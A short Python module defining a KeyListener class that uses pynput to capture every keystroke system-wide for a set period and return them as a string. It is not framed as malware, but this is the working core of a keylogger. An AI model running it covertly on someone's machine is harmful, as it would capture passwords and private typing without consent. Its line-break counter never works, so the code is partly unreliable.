import threading
import time
from pynput import keyboard

class KeyListener:
    def __init__(self):
        """
        Initializes the object.

        Args:
            self: The object instance.

        Returns:
            None
        """
        self.keys = []
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener_thread = None
        self.lock = threading.Lock()

    def on_press(self, key):
        """
        Adds the pressed key to the list of keys if it is a character key.

        Parameters:
            key (Key): The key that was pressed.

        Returns:
            None
        """
        try:
            cont = 0
            if key == keyboard.Key.space:
                self.keys.append(' ')
                cont += 1
            else:
                self.keys.append(key.char)
                cont += 1
            # Space between keys to improve readability
            if cont > 70:
                self.keys.append('\n')
                cont = 0
        except AttributeError:
            pass

    def start_listener(self):
        """
        Starts the listener thread.

        This function starts the listener thread by calling the `start` method on the `listener_thread` object.

        Parameters:
            None

        Returns:
            None
        """
        self.listener_thread = threading.Thread(target=self.listener.run)
        self.listener_thread.start()

    def stop_listener(self):
        """
        Stop the listener and join the listener thread.

        This function stops the listener and waits for the listener thread to finish execution.

        Parameters:
            None

        Returns:
            None
        """
        self.listener.stop()
        self.listener_thread.join()

    def read_keys(self, timeout=60):
        """
        Reads the keys from the listener for a specified duration.

        Args:
            timeout (float): The duration in seconds to wait for keys.
        
        Returns:
            str: A string containing all the keys read from the listener.
        """
        with self.lock:
            self.start_listener()
            time.sleep(timeout)
            self.stop_listener()
            return ''.join(self.keys)
    
    def get_last_keys(self):
        """
        Returns a string that is the concatenation of all the keys in the `self.keys` list.

        Parameters:
            self (object): The instance of the class.

        Returns:
            str: The string that is the concatenation of all the keys.
        """
        return ''.join(self.keys)